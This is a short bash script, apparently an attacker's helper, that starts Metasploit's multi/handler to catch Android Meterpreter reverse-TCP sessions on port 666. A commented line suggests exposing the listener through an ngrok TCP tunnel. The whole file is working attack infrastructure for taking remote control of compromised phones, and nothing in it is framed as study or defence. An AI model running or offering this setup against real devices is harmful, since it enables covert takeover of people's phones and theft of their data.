#!/bin/bash
#./ngrok tcp 666
msfconsole -x "use multi/handler;
set PAYLOAD android/meterpreter/reverse_tcp;
set LHOST 127.0.0.1;
set LPORT 666;
set ExitOnSession false;
run"
